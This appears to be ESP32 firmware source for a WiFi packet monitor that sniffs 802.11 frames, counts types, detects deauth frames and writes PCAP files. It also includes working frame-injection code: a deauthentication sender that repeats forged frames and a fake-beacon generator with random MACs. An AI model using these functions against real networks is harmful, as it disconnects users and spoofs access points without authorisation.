/**
 * Packet Monitor implementation
 */

#include "PacketMonitor.h"
#include <SD.h>

// Static instance pointer
PacketMonitor* PacketMonitor::instance = nullptr;

PacketMonitor::PacketMonitor() : 
    monitoring(false),
    currentChannel(1),
    packetsTotal(0),
    beaconCount(0),
    probeCount(0),
    deauthCount(0),
    dataCount(0),
    mgmtCount(0),
    ctrlCount(0),
    startTime(0),
    lastPacketTime(0),
    pcapActive(false) {
}

void PacketMonitor::init() {
    instance = this;
    Serial.println("Packet Monitor initialized");
}

bool PacketMonitor::startMonitor(uint8_t channel) {
    if (monitoring) {
        return false;
    }
    
    // Disconnect from any WiFi network
    WiFi.disconnect();
    delay(10);
    
    // Set WiFi to promiscuous mode
    WiFi.mode(WIFI_MODE_STA);
    
    // Set channel
    if (channel > 0 && channel <= 14) {
        currentChannel = channel;
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    }
    
    // Reset statistics
    resetStats();
    startTime = millis();
    
    // Start promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback);
    
    monitoring = true;
    Serial.printf("Packet monitoring started on channel %d\n", currentChannel);
    
    return true;
}

void PacketMonitor::stopMonitor() {
    if (!monitoring) {
        return;
    }
    
    // Stop promiscuous mode
    esp_wifi_set_promiscuous(false);
    
    monitoring = false;
    
    // Stop PCAP if active
    if (pcapActive) {
        stopPCAP();
    }
    
    Serial.println("Packet monitoring stopped");
}

void PacketMonitor::setChannel(uint8_t channel) {
    if (channel >= 1 && channel <= 14) {
        currentChannel = channel;
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    }
}

void PacketMonitor::hopChannel() {
    currentChannel++;
    if (currentChannel > 14) {
        currentChannel = 1;
    }
    setChannel(currentChannel);
}

// Static callback for promiscuous mode
void PacketMonitor::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!instance) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
    
    // Update packet count
    instance->packetsTotal++;
    instance->lastPacketTime = millis();
    
    // Get frame control field
    uint16_t frameControl = *((uint16_t*)pkt->payload);
    uint8_t frameType = (frameControl & 0x0C) >> 2;
    uint8_t frameSubType = (frameControl & 0xF0) >> 4;
    
    // Create packet info
    PacketInfo info;
    info.type = frameType;
    info.subtype = frameSubType;
    info.channel = ctrl.channel;
    info.rssi = ctrl.rssi;
    info.timestamp = millis();
    info.length = ctrl.sig_len;
    
    // Extract MAC addresses (if present)
    if (ctrl.sig_len >= 24) {
        memcpy(info.dstMAC, pkt->payload + 4, 6);
        memcpy(info.srcMAC, pkt->payload + 10, 6);
    }
    
    // Process based on frame type
    switch (frameType) {
        case FRAME_TYPE_MGMT:
            instance->mgmtCount++;
            instance->processMgmtFrame(pkt->payload, ctrl.sig_len, ctrl.rssi);
            break;
        case FRAME_TYPE_DATA:
            instance->dataCount++;
            instance->processDataFrame(pkt->payload, ctrl.sig_len, ctrl.rssi);
            break;
        case FRAME_TYPE_CTRL:
            instance->ctrlCount++;
            instance->processCtrlFrame(pkt->payload, ctrl.sig_len, ctrl.rssi);
            break;
    }
    
    // Write to PCAP if active
    if (instance->pcapActive && instance->pcapFile) {
        uint32_t ts_sec = info.timestamp / 1000;
        uint32_t ts_usec = (info.timestamp % 1000) * 1000;
        instance->writePCAP_PacketHeader(ts_sec, ts_usec, ctrl.sig_len);
        instance->writePCAP_PacketData(pkt->payload, ctrl.sig_len);
    }
    
    // Call user callback if set
    if (instance->packetCallback) {
        instance->packetCallback(info);
    }
}

void PacketMonitor::processMgmtFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 24) return;
    
    uint16_t frameControl = *((uint16_t*)payload);
    uint8_t frameSubType = (frameControl & 0xF0) >> 4;
    
    switch (frameSubType) {
        case FRAME_SUBTYPE_BEACON:
            beaconCount++;
            break;
        case FRAME_SUBTYPE_PROBE_REQ:
        case FRAME_SUBTYPE_PROBE_RESP:
            probeCount++;
            break;
        case FRAME_SUBTYPE_DEAUTH:
            deauthCount++;
            Serial.printf("Deauth packet detected! RSSI: %d\n", rssi);
            break;
    }
}

void PacketMonitor::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Process data frames
}

void PacketMonitor::processCtrlFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Process control frames
}

uint32_t PacketMonitor::getPacketsPerSec() const {
    if (!monitoring || packetsTotal == 0) {
        return 0;
    }
    
    uint32_t elapsed = (millis() - startTime) / 1000;
    if (elapsed == 0) elapsed = 1;
    
    return packetsTotal / elapsed;
}

void PacketMonitor::resetStats() {
    packetsTotal = 0;
    beaconCount = 0;
    probeCount = 0;
    deauthCount = 0;
    dataCount = 0;
    mgmtCount = 0;
    ctrlCount = 0;
}

// Packet injection
bool PacketMonitor::injectPacket(const uint8_t* data, uint16_t len) {
    if (!monitoring) {
        return false;
    }
    
    // Use esp_wifi_80211_tx to inject raw packets
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, data, len, false);
    return (result == ESP_OK);
}

bool PacketMonitor::sendDeauth(const uint8_t* apMAC, const uint8_t* stationMAC, uint8_t reason) {
    // Deauth frame structure
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control (Deauthentication)
        0x00, 0x00,  // Duration
        // Destination MAC (6 bytes)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Source MAC (6 bytes)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // BSSID (6 bytes)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,  // Sequence Control
        0x01, 0x00   // Reason Code
    };
    
    // Set addresses
    memcpy(deauthPacket + 4, stationMAC, 6);   // Destination
    memcpy(deauthPacket + 10, apMAC, 6);       // Source
    memcpy(deauthPacket + 16, apMAC, 6);       // BSSID
    deauthPacket[24] = reason;                  // Reason code
    
    // Send multiple times for better effect
    bool success = true;
    for (int i = 0; i < 5; i++) {
        if (!injectPacket(deauthPacket, sizeof(deauthPacket))) {
            success = false;
        }
        delay(1);
    }
    
    return success;
}

bool PacketMonitor::sendBeacon(const char* ssid, uint8_t channel) {
    // Basic beacon frame
    uint8_t beaconPacket[128] = {0};
    uint8_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;
    
    // Frame control
    beaconPacket[0] = 0x80;  // Beacon frame
    beaconPacket[1] = 0x00;
    
    // Duration
    beaconPacket[2] = 0x00;
    beaconPacket[3] = 0x00;
    
    // Destination (broadcast)
    memset(beaconPacket + 4, 0xFF, 6);
    
    // Source MAC (random)
    beaconPacket[10] = 0x02;  // Locally administered
    for (int i = 11; i < 16; i++) {
        beaconPacket[i] = random(256);
    }
    
    // BSSID (same as source)
    memcpy(beaconPacket + 16, beaconPacket + 10, 6);
    
    // Sequence control
    beaconPacket[22] = 0x00;
    beaconPacket[23] = 0x00;
    
    // Fixed parameters (24-35)
    // Timestamp (8 bytes)
    uint64_t timestamp = millis() * 1000;
    memcpy(beaconPacket + 24, &timestamp, 8);
    
    // Beacon interval (2 bytes)
    beaconPacket[32] = 0x64;  // 100 TU
    beaconPacket[33] = 0x00;
    
    // Capability info (2 bytes)
    beaconPacket[34] = 0x01;  // ESS
    beaconPacket[35] = 0x00;
    
    // Tagged parameters
    uint8_t pos = 36;
    
    // SSID element
    beaconPacket[pos++] = 0x00;  // Element ID
    beaconPacket[pos++] = ssidLen;
    memcpy(beaconPacket + pos, ssid, ssidLen);
    pos += ssidLen;
    
    // Supported rates
    beaconPacket[pos++] = 0x01;  // Element ID
    beaconPacket[pos++] = 0x08;  // Length
    beaconPacket[pos++] = 0x82;  // 1 Mbps
    beaconPacket[pos++] = 0x84;  // 2 Mbps
    beaconPacket[pos++] = 0x8b;  // 5.5 Mbps
    beaconPacket[pos++] = 0x96;  // 11 Mbps
    beaconPacket[pos++] = 0x24;  // 18 Mbps
    beaconPacket[pos++] = 0x30;  // 24 Mbps
    beaconPacket[pos++] = 0x48;  // 36 Mbps
    beaconPacket[pos++] = 0x6c;  // 54 Mbps
    
    // DS Parameter Set
    beaconPacket[pos++] = 0x03;  // Element ID
    beaconPacket[pos++] = 0x01;  // Length
    beaconPacket[pos++] = channel;
    
    return injectPacket(beaconPacket, pos);
}

// PCAP functions
bool PacketMonitor::startPCAP(const char* filename) {
    if (pcapActive) {
        return false;
    }
    
    // Open file
    pcapFile = SD.open(filename, FILE_WRITE);
    if (!pcapFile) {
        Serial.println("Failed to open PCAP file");
        return false;
    }
    
    // Write global header
    writePCAP_GlobalHeader();
    
    pcapActive = true;
    Serial.printf("PCAP capture started: %s\n", filename);
    
    return true;
}

void PacketMonitor::stopPCAP() {
    if (!pcapActive) {
        return;
    }
    
    pcapFile.close();
    pcapActive = false;
    
    Serial.println("PCAP capture stopped");
}

void PacketMonitor::writePCAP_GlobalHeader() {
    if (!pcapFile) return;
    
    // PCAP global header
    pcapFile.write((uint8_t)0xD4);  // Magic number
    pcapFile.write((uint8_t)0xC3);
    pcapFile.write((uint8_t)0xB2);
    pcapFile.write((uint8_t)0xA1);
    
    pcapFile.write((uint8_t)0x02);  // Version major
    pcapFile.write((uint8_t)0x00);
    pcapFile.write((uint8_t)0x04);  // Version minor
    pcapFile.write((uint8_t)0x00);
    
    // Timezone offset (0)
    for (int i = 0; i < 8; i++) {
        pcapFile.write((uint8_t)0x00);
    }
    
    // Snaplen (65535)
    pcapFile.write((uint8_t)0xFF);
    pcapFile.write((uint8_t)0xFF);
    pcapFile.write((uint8_t)0x00);
    pcapFile.write((uint8_t)0x00);
    
    // Network type (IEEE 802.11)
    pcapFile.write((uint8_t)0x7F);
    pcapFile.write((uint8_t)0x00);
    pcapFile.write((uint8_t)0x00);
    pcapFile.write((uint8_t)0x00);
}

void PacketMonitor::writePCAP_PacketHeader(uint32_t ts_sec, uint32_t ts_usec, uint32_t len) {
    if (!pcapFile) return;
    
    // Timestamp seconds
    pcapFile.write((uint8_t)(ts_sec & 0xFF));
    pcapFile.write((uint8_t)((ts_sec >> 8) & 0xFF));
    pcapFile.write((uint8_t)((ts_sec >> 16) & 0xFF));
    pcapFile.write((uint8_t)((ts_sec >> 24) & 0xFF));
    
    // Timestamp microseconds
    pcapFile.write((uint8_t)(ts_usec & 0xFF));
    pcapFile.write((uint8_t)((ts_usec >> 8) & 0xFF));
    pcapFile.write((uint8_t)((ts_usec >> 16) & 0xFF));
    pcapFile.write((uint8_t)((ts_usec >> 24) & 0xFF));
    
    // Captured length
    pcapFile.write((uint8_t)(len & 0xFF));
    pcapFile.write((uint8_t)((len >> 8) & 0xFF));
    pcapFile.write((uint8_t)((len >> 16) & 0xFF));
    pcapFile.write((uint8_t)((len >> 24) & 0xFF));
    
    // Original length
    pcapFile.write((uint8_t)(len & 0xFF));
    pcapFile.write((uint8_t)((len >> 8) & 0xFF));
    pcapFile.write((uint8_t)((len >> 16) & 0xFF));
    pcapFile.write((uint8_t)((len >> 24) & 0xFF));
}

void PacketMonitor::writePCAP_PacketData(const uint8_t* data, uint32_t len) {
    if (!pcapFile) return;
    
    pcapFile.write(data, len);
}